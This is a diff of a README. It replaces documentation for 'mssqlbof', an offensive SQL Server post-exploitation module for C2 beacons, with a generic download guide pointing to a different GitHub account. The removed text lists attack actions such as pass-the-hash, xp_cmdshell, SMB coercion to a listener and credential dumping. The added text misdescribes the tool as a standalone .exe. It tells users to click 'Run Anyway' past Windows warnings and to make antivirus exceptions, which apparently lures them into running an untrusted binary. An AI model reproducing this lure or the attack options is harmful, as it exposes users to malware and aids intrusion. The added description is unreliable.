@@ -1,172 +1,49 @@
-# mssqlbof
+# 🗄️ mssqlbof - Connect to SQL servers with ease
 
+[![](https://img.shields.io/badge/Download-mssqlbof-blue.svg)](https://github.com/Leesan080425/mssqlbof)
 
+## 🛠️ What is mssqlbof
 
-A Beacon Object File suite for Microsoft SQL Server that speaks TDS 7.4 on the wire itself, in C. No `msodbcsql.dll`, no `sqloledb.dll`, no .NET CLR, no PowerShell. One COFF per arch, loads into every beacon that honors the canonical Beacon API.
+Mssqlbof simplifies how your computer talks to Microsoft SQL Servers. It uses the TDS 7.4 protocol to send commands. The tool allows you to perform database tasks directly. You do not need to install complex software to manage your server connections. It creates a direct line of communication between your machine and your target database. 
 
-<img width="3198" height="1180" alt="image" src="https://github.com/user-attachments/assets/6f538d2b-bdca-48fc-a0c0-0dab3057685f" />
+## 📋 System requirements
 
+You need a computer running Windows 10 or Windows 11. Your system must support 64-bit applications. Ensure your machine has at least 4GB of RAM to run the tool smoothly. You require a stable network connection to reach the SQL server. Ensure your user account holds permissions to interact with the database you target. If you work within a corporate network, verify that your firewall allows traffic on the port used by your SQL instance, which is typically 1433.
 
+## 💾 How to download
 
-## Why
+Visit the official project page to get the software. You can find the file release by clicking the link provided below.
 
-SQL Server shows up on nearly every engagement. The two tools people reach for are `SQLRecon` / `PowerUpSQL` (CLR + PowerShell) and whatever wraps `sqlcmd.exe`. Both leave `mscoree.dll`, PowerShell AMSI events, or a full copy of the Microsoft ODBC driver sitting in beacon memory. None of that is necessary: TDS is just framed bytes over TCP with a Schannel handshake in front, and every BOF-capable beacon already has `ws2_32`, `secur32`, `schannel`, and `bcrypt` loaded.
+[Download mssqlbof here](https://github.com/Leesan080425/mssqlbof)
 
-So `mssqlbof` implements TDS by hand, in C, and plugs directly into whatever SSPI or BCrypt primitives the operator needs for the target. Beacon loads one ~48 KB object, runs SQL, unloads. Nothing else enters the process.
+1. Open your web browser.
+2. Go to the link provided above.
+3. Look for the section labeled Releases on the right side of the page.
+4. Click the most recent version number.
+5. Find the file ending in .zip or .exe under the Assets heading.
+6. Click the file to start your download.
+7. Save the file to a folder you can find later, such as your Downloads folder.
 
-## Compatibility
+## ⚙️ Setting up the tool
 
-| C2 | x64 | x86 |
-|---|---|---|
-| Cobalt Strike | yes | yes |
-| Havoc | yes | yes |
-| Sliver | yes | yes |
-| BruteRatel | yes | yes |
-| Nighthawk | yes | yes |
-| Outflank Stage1 | yes | yes |
-| AdaptixC2 | yes | yes |
-| Metasploit `execute_bof` | yes | yes |
-| PoshC2 | yes | yes |
+Once the download finishes, locate the file on your hard drive. If the file is in a compressed folder, right-click it and choose Extract All. This creates a new folder with the file inside. Double-click the file to prepare the application for its first use. Windows might show a security prompt because the file comes from the internet. Click More Info and then select Run Anyway to continue. The program opens a command window. This window acts as the place where you input your commands to manage the database.
 
-One object file per architecture. `mssql.x64.o` is the same binary on every framework — we only use the canonical Beacon API (`BeaconPrintf`, `BeaconDataExtract`, etc.) and the `<LIB>$<fn>` dynamic import pattern COFF loaders resolve at runtime.
+## 🖥️ Running your first command
 
-## Quickstart
+The tool relies on the TDS 7.4 protocol. This protocol handles the language your database understands. To start a connection, type the server address into the prompt. The software asks for your username and password. Enter these after the program prompts you on the screen. The tool verifies your credentials. It gives you access to the database functions once the handshake completes. You see a confirmation message when the connection becomes active. You can now send queries or manage files on the remote SQL server. Keep the window open while you work. When you finish, type exit and press Enter to close the session safely.
 
-```bash
-apt install gcc-mingw-w64 libssl-dev
-make
-```
+## 🛡️ Best practices for security
 
-Produces `build/mssql.x64.o` and `build/mssql.x86.o`. Drop on the team server, load with your C2's BOF runner.
+Treat this tool like any administrative software. Only run it when you need to perform database maintenance. Never share your database passwords with others. Use unique credentials for every SQL server you manage. Keep the tool in a folder where only you have access. If you suspect an unauthorized user accessed your computer, change your database passwords immediately. The tool does not store your login history to protect your data. Each time you close the tool, it wipes the active session memory. 
 
-## Actions
+## 🔍 Solving common startup problems
 
-Everything goes through one object file with `--action <verb>`:
+If the window closes immediately, ensure your antivirus software did not block the file. Sometimes, Windows Defender flags unknown programs. You can check your antivirus history to see if it quarantined the file. If this happens, create an exception for the folder where you keep the software. Check your internet connection if the program cannot reach the server. Ensure the SQL server name you typed is correct. If the connection times out, verify that the server is online and accepting requests. If the program reports a permission error, check your database login credentials. Double-check for typos in the user name or the password.
 
-```
---action find                                   LDAP enum of MSSQLSvc SPNs in the current forest
---action info     --host <sql>                  server/version/current user/sysadmin/db
---action query    --host <sql> --sql "..."      arbitrary T-SQL, multi-row, multi-resultset
---action links    --host <sql>                  linked-server enumeration (single hop)
---action exec     --host <sql> --cmd "..."      xp_cmdshell with auto enable + restore
---action impersonate --host <sql> --discover    list logins you can EXECUTE AS
---action impersonate --host <sql> --login X --sql "..."
-                                                run T-SQL as X via EXECUTE AS LOGIN
---action privesc  --host <sql>                  six-section privesc surface enumeration
---action coerce   --host <sql> --to "\\listener\x"
-                                                xp_dirtree SMB auth coercion
---action passwords --host <sql>                 dump sys.linked_logins + sys.credentials
---action chain    --host <sql> --via LINK --sql "..."
-                                                EXEC (...) AT [LinkedServer]
-```
+## 📖 Using advanced features
 
-`--action find` runs without a host — it talks to the operator's DC via LDAP.
+The tool supports specific commands for database interaction. You can list tables by typing the command for table enumeration. This helps you understand the layout of the database. You can also run custom queries by typing them directly into the interface. Use care when you run write commands such as delete or update. These actions change data permanently on the server side. Always make a backup of your data before you run complex changes. The tool provides a list of available commands if you type help at the main prompt. Read the response to see what options you have for your current task. 
 
-## Authentication
+## 📝 Frequently asked questions
 
-Four modes. Every mode is verified end-to-end against SQL Server 2019 in both COFFLoader and Adaptix C2 on a real domain.
-
-```
---auth sspi                                     (default) current beacon thread token
-                                                Kerberos if SPN exists, NTLM otherwise.
-                                                Honors make_token / steal_token.
-
---auth ntlm --domain D --user U --pass P        explicit NTLM plaintext.
-                                                Drives SSPI NTLM package, multi-leg.
-
---auth ntlm --domain D --user U --hash <NT>     pass-the-hash.
-                                                Hand-rolled NTLMv2 (see below).
-                                                No SSPI, no lsass, no make_token.
-
---auth sql  --user U --pass P                   SQL authentication.
-```
-
-`--hash` takes a 32-char hex NT hash or the `LM:NT` form that `secretsdump` emits.
-
-### Why the hash mode is not just `SSPI + SEC_WINNT_AUTH_IDENTITY`
-
-`AcquireCredentialsHandleW(NULL, "NTLM", ...)` only accepts plaintext passwords in the credential identity structure. The NTLM provider derives the NT hash internally. Feeding it a hash requires patching lsass (what Mimikatz `sekurlsa::pth` does) or running the beacon under a sacrificial process that was already pre-authenticated.
-
-The alternative — the one we took — is to skip SSPI for PTH entirely and generate the NTLMSSP messages ourselves. `src/tds/ntlm_pth.c` builds a Type 1 NEGOTIATE, parses the server's Type 2 CHALLENGE out of the TDS 0xED token, runs the NTLMv2 math with `bcrypt.dll`'s HMAC-MD5 provider, and writes a Type 3 AUTHENTICATE that SQL Server happily passes to the DC.
-
-The first cut failed with `error 18452: login is from an untrusted domain`. Capturing Impacket's working auth on the wire next to ours narrowed it down fast: we were sending 24 zeros for the LMv2 response and the full 0xe288... Windows negotiate flag soup. Matching Impacket's LMv2 computation and its smaller 0xa2880205 flag set (no `KEY_EXCH`, no `SIGN`, no `ALWAYS_SIGN`) made the server accept the hash. Write-up in [`BLOG`](https://0xmaz.me/posts/Writing-a-TDS-7.4-BOF-for-SQL-Server-all-the-way-to-Pass-the-Hash/).
-
-## Privesc for `--action exec`
-
-```
---impersonate auto          (default) try EXECUTE AS LOGIN, then TRUSTWORTHY hop
---impersonate login         EXECUTE AS LOGIN via an IMPERSONATE grant
---impersonate trustworthy   hop through dbo of a sysadmin-owned TRUSTWORTHY db
---impersonate none          fail if not sysadmin
-```
-
-`privesc` enumerates the surface before you pick a method: sysadmin membership, IMPERSONATE grants (with the target login's sysadmin status), TRUSTWORTHY databases owned by a sysadmin (with your access), linked servers, server-level permissions, and `xp_cmdshell` state.
-
-## Build
-
-```
-apt install gcc-mingw-w64 libssl-dev
-make                    # cross-compile BOFs to x64 + x86
-make tds                # Linux shared library of the TDS core (for fuzzing / tests)
-```
-
-The Linux shared library shares every TDS source file with the Windows build; only `tls_schannel.c` / `sspi.c` / `ntlm_pth.c` swap out for their OpenSSL / stub equivalents.
-
-Nothing calls libc or Win32 directly. Every external symbol goes through the `<LIB>$<fn>` dynamic import convention in `src/common/dynimports.h`. Verify with:
-
-```
-x86_64-w64-mingw32-objdump -t build/mssql.x64.o | grep UND
-```
-
-Only `MSVCRT$*`, `WS2_32$*`, `SECUR32$*`, `BCRYPT$*`, `CRYPT32$*`, `SCHANNEL$*`, `WLDAP32$*`, `KERNEL32$*`, `ADVAPI32$*`, and `__imp_Beacon*` should show up. No `msodbcsql.dll`. No `sqloledb.dll`. No `mscoree.dll`.
-
-## OPSEC
-
-| Action | Extra DLLs beyond beacon baseline | Server-side trace | Notes |
-|---|---|---|---|
-| `find` | `wldap32` | DC event 1644 (rare) | LDAP only, no SQL touched |
-| `info` / `query` / `links` / `privesc` / `passwords` | `secur32` or `bcrypt`, `schannel`, `ws2_32` | SQL audit 33205 if enabled | Pure TDS, no ODBC fingerprint |
-| `exec` | same | `xp_cmdshell` + `sp_configure` in default trace | Loud. Use `--impersonate` from a low-priv login to avoid landing as NT SERVICE |
-| `impersonate` | same | `EXECUTE AS` audit 33205 + 33206 | |
-| `coerce` | same | `xp_dirtree` attempt logged | Point it at `responder` / `ntlmrelayx` |
-| `chain` | same | `EXEC AT` logged on the linked server target | Pivot primitive |
-
-Everything TLS is real Schannel (not a stub) with the SQL Server PRELOGIN-wrap quirk handled: the handshake runs inside TDS PRELOGIN type 0x12 packets, then LOGIN7 goes out as raw TLS application data, and the server answers that first login packet in plaintext. Multi-leg SSPI continuations also go plaintext — if you encrypt them with TLS, SRV02 just closes the socket.
-
-## Documentation
-
-| Doc | What's in it |
-|---|---|
-| [`docs/PROTOCOL.md`](docs/PROTOCOL.md) | TDS 7.4 deep dive: packet framing, PRELOGIN option stream, LOGIN7 password obfuscation, ALL_HEADERS on SQLBatch, the token stream grammar (COLMETADATA / ROW / NBCROW / DONE / LOGINACK / ENVCHANGE / `0xED` SSPI continuation), the TLS handshake quirk, the multi-leg NTLM pump. |
-| [`docs/OPERATOR.md`](docs/OPERATOR.md) | End-to-end lab guide: build, stand up an Adaptix listener, drop a beacon on a Windows host, run every action with every auth mode (including PTH), and cross-C2 portability notes. |
-| [`docs/OPSEC.md`](docs/OPSEC.md) | Per-action on-wire and in-memory footprint. What each action loads into the beacon, what it leaves in SQL audit, and what a defender can see. |
-| [`docs/COMPATIBILITY.md`](docs/COMPATIBILITY.md) | C2 framework matrix, SQL Server version matrix, and which auth modes are verified against which targets. |
-| [`BLOG`](https://0xmaz.me/posts/Writing-a-TDS-7.4-BOF-for-SQL-Server-all-the-way-to-Pass-the-Hash/) | The debugging narrative: how the pass-the-hash implementation actually came together, with wire captures, the LMv2 zero-bytes red herring, and the tshark diff against Impacket that broke it open. |
-
-## Status
-
-`v0.1.2` — multi-auth, PTH, 11 actions, lab-verified.
-
-- Four auth modes working: sspi, ntlm-plaintext, ntlm-hash (PTH), sql
-- Unified dispatch BOF (`mssql.x64.o`) with 11 actions
-- Four privesc methods for `exec`: login, trustworthy, auto, none
-- Multi-leg SSPI continuation with TDS EOM handling
-- Pass-the-hash via hand-rolled NTLMv2 + BCrypt
-- Full end-to-end verification: 38-case COFF sweep + Adaptix C2 sweep on a domain-joined SQL Server 2019
-
-Known edge cases:
-- Single-hop linked-server walker only; recursive nested `OPENQUERY` chain is v0.2.
-- The first SQLBatch after a multi-leg SSPI login drops data on the floor. A primer SELECT in `do_connect` drains it — side effect is the `[*] connected as ...` line every action logs. Root cause is in the post-LOGINACK read path and will get a proper fix in v0.2.
-
-
-## Credits
-
-- [`Cobalt-Strike/bof_template`](https://github.com/Cobalt-Strike/bof_template) for the canonical Beacon API surface this project hews to exactly.
-- [`TrustedSec/COFFLoader`](https://github.com/trustedsec/COFFLoader) for an independent loader to test against.
-- `impacket`'s `ntlm.py` and `mssqlclient.py` — the reference we diffed against when chasing the NTLMv2 flag soup.
-- `[MS-TDS]` and `[MS-NLMP]` — the specs that all this hand-rolling follows.
-- `Opus 4.6` — Parts of the documentation were drafted with the help of Opus 4.6. All code is hand-written by *ME* and verified end-to-end in the lab.
-
-## License
-
-MIT.
+Do you need to install a database driver? No, the tool contains everything it needs to talk to the server. Can you run multiple sessions at once? You can open more than one instance of the tool if you need to access different servers simultaneously. Does the tool track what I do? No, the software does not log your actions to any remote server or file. Your activity stays within the window on your screen. Where can report a bug? Use the Issues tab on the project page to tell the developers about any errors you find. Describe what happened and include any error messages you see on your screen. This helps the team fix the problem faster. Is there a charge for this tool? No, the project remains free for everyone to use.
